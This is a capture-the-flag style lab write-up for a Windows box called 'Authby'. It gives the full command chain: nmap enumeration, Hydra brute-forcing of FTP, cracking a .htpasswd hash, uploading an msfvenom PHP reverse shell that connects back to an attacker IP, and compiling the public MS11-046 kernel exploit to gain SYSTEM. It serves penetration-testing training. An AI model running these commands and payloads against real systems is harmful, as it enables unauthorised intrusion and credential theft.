---
description: Privilege escalation using Kernel level exploit
---

# Authby

## Summary.

* Enumeration of the FTP server with Anonymous access enabled revealed potential usernames&#x20;
  * Bruteforcing gave away the credentials for the `admin` user.&#x20;
* Logging into FTP as `Admin` provided access to a `.htpasswd` file containing web server credentials.&#x20;
* With write access to FTP, a reverse shell was uploaded to gain an initial foothold on the machine.
* Finally, the [<mark style="color:red;">MS11-046</mark>](https://www.exploit-db.com/exploits/40564) vulnerability was leveraged to elevate access to the Administrator user.

## Let's unpack

### Enumeration

```bash
#nmap
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.161.46

>
 
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jun 29 19:09 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Mar 23 13:28 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2024-06-29T12:17:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-03-22T06:28:30
|_Not valid after:  2024-09-21T06:28:30
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2024-06-29T12:17:10+00:00

```

Enumerating FTP

```bash
# anonymous login to FTP 
total 4
dr-xr-xr-x   1 root     root          512 Mar 23 13:28 backup
----------   1 root     root          764 Mar 23 13:28 acc[Offsec].uac
----------   1 root     root         1030 Mar 23 13:28 acc[anonymous].uac
----------   1 root     root          926 Mar 23 13:28 acc[admin].uac

# potential usernames
> 
-admin
-offsec
-anonymous

# using Hydra to bruteforce the password
hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp

# Boom! got the password
[21][ftp] host: 192.168.161.46   login: admin   password: admin

# On logging into FTP using admin creds, we found interesting files
cat .htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

# Eccrypting password using john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
elite            (?)     

```

Discovered Credential

```bash
# FTP
admin:admin

# HTTP
offsec:elite
```



### Initial Foothold

#### Getting a shell on the server

* We have `admin` credentials for FTP that hold the file for the webserver.
* We know the credentials of the HTTP server.
* We can simply upload a web shell using an FTP server and open it on the http server

```bash
 # generated initial reverse shell payload using msfvenom
msfvenom -p php/reverse_php LHOST=192.168.45.152 LPORT=4444 -f raw > shell.php

# Uploading the shell via FTP
Put ex.php

# executing webshell 
curl -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' 'http://192.168.223.46:242/shell.php'

# Caught the reverse shell
nc -nlvp 4444


```

### Privilege Escalation/Lateral Movement

Using `windows-exploit-suggestor` to find priv escalation vector

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}

Found a priv Escalation vector -> MS11-046

[https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)

```bash
# Compiling and Executing the exploit
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

# uploading the exploit using FTP
puts MS11-046.exe

# got NT AUTHORITY\SYSTEM privilege on exeuting the exploit

```
